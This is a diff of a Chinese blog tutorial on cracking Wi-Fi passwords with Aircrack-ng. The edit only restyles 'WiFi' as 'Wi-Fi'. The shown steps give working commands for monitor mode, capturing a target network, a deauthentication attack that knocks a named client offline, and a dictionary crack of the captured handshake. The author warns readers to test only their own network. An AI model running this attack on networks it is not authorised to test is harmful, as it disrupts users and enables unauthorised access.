@@ -2,7 +2,7 @@
 title: 使用 Aircrack-ng 破解 WI-FI密码
 abbrlink: 6e155fd
 date: 2025-11-02 21:30:02
-updated: 2025-11-02 22:33:47
+updated: 2025-11-02 22:36:33
 tags:
   - kali
   - linux
@@ -10,11 +10,11 @@ tags:
 
 ## 说在前面
 
-**不建议在未经允许的情况下破解他人的 WiFi，建议使用自己的 WiFi 测试。**
+**不建议在未经允许的情况下破解他人的 Wi-Fi，建议使用自己的 Wi-Fi 测试。**
 
-本方案的原理：监听目标 WiFi，同时对目标 WiFi 发起攻击，使正常连接该 WiFi 的设备断线，断线后设备会尝试重新连接 WiFi，此时会发送包含加密过的密码的握手包，我们就能抓取到发送该握手包，再用字典中的密码挨个按照相同加密方式去匹配抓到的握手包。
+本方案的原理：监听目标 Wi-Fi，同时对目标 Wi-Fi 发起攻击，使正常连接该 Wi-Fi 的设备断线，断线后设备会尝试重新连接 Wi-Fi，此时会发送包含加密过的密码的握手包，我们就能抓取到发送该握手包，再用字典中的密码挨个按照相同加密方式去匹配抓到的握手包。
 
-简而言之：最后能不能成功还是依赖于字典，只有 WiFi 密码刚好在字典中存在才能有机会匹配到，不存在那就没戏了，暴力破解就是这样子的，全靠运气和莽 😂。
+简而言之：最后能不能成功还是依赖于字典，只有 Wi-Fi 密码刚好在字典中存在才能有机会匹配到，不存在那就没戏了，暴力破解就是这样子的，全靠运气和莽 😂。
 
 ## 准备测试环境
 
@@ -56,7 +56,7 @@ airmon-ng start wlan0
 airmon-ng check kill
 ```
 
-### 3. 列出附近 wifi 网络，记下目标 wifi 的 BSSID 和 CH（信道）
+### 3. 列出附近的 Wi-Fi 网络，记下目标 Wi-Fi 的 BSSID 和 CH（信道）
 
 ```bash
 airodump-ng wlan0mon
@@ -64,10 +64,10 @@ airodump-ng wlan0mon
 
 注意这里的无线网卡名称是  `wlan0mon`, 而不是  `wlan0`。因为刚刚开启了监听 (monitor) 模式。
 
-### 4. 监听目标 wifi
+### 4. 监听目标 Wi-Fi
 
 ```bash
-airodump-ng --bssid 2C:B2:1A:22:51:86 -c 3 -w ~/wifi_capture wlan0mon
+airodump-ng --bssid 2C:B2:1A:22:51:86 -c 3 -w ~/Wi-Fi_capture wlan0mon
 ```
 
 ### 5. 发送 Deauthentication 攻击
@@ -87,7 +87,7 @@ aireplay-ng --deauth 10 -a 2C:B2:1A:22:51:86 -c 9C:5A:81:2A:C1:49 wlan0mon
 ### 6. 使用字典破解 Wi-Fi 密码
 
 ```bash
-aircrack-ng -w /usr/share/wordlists/rockyou.txt wifi_capture-01.cap
+aircrack-ng -w /usr/share/wordlists/rockyou.txt Wi-Fi_capture-01.cap
 ```
 
 这里使用的是 kali 自带的密码本，为提高成功概率，可把 -w 后面的 txt 文件换成自定义专用密码本。
